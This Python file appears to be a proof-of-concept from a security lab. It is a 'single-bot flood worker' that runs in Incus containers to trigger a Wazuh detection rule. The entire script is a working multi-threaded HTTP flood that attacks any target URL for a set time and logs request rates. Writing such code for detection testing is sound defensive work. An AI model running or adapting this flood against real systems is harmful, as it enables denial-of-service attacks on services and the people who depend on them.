#!/usr/bin/env python3
"""
Threat 4 PoC: single-bot flood worker. Runs inside an Incus bot container.
Launched by demo_botnet.sh; requires explicit --target (no Incus dependency).

Usage (from inside a bot container):
    python3 /root/poc/botnet_attack.py --target http://<ip>:5600 [--threads 20] [--duration 90]
"""
import argparse
import threading
import time
import urllib.request
import urllib.error
from datetime import datetime

parser = argparse.ArgumentParser(description="Botnet bot — single-node flood worker")
parser.add_argument("--target",   required=True, help="Target URL (e.g. http://10.x.x.x:5600)")
parser.add_argument("--threads",  type=int, default=20,  help="Concurrent threads (default: 20)")
parser.add_argument("--duration", type=int, default=90,  help="Attack duration in seconds (default: 90)")
args = parser.parse_args()

requests_sent = 0
errors = 0
lock = threading.Lock()
stop_event = threading.Event()


def flood():
    global requests_sent, errors
    while not stop_event.is_set():
        try:
            urllib.request.urlopen(args.target, timeout=2)
            with lock:
                requests_sent += 1
        except Exception:
            with lock:
                errors += 1


print(f"[*] Bot starting — target: {args.target}")
print(f"[*] {args.threads} threads for {args.duration}s")
print(f"[*] Triggering Wazuh rule 100002 (50+ req/10s from this IP)")

threads = [threading.Thread(target=flood, daemon=True) for _ in range(args.threads)]
for t in threads:
    t.start()

start = time.time()
while time.time() - start < args.duration:
    time.sleep(10)
    elapsed = time.time() - start
    with lock:
        rate = requests_sent / max(elapsed, 1)
    print(f"[{datetime.now().strftime('%H:%M:%S')}] sent={requests_sent} errors={errors} rate={rate:.1f}/s")

stop_event.set()
print(f"[+] Bot done. sent={requests_sent} errors={errors}")
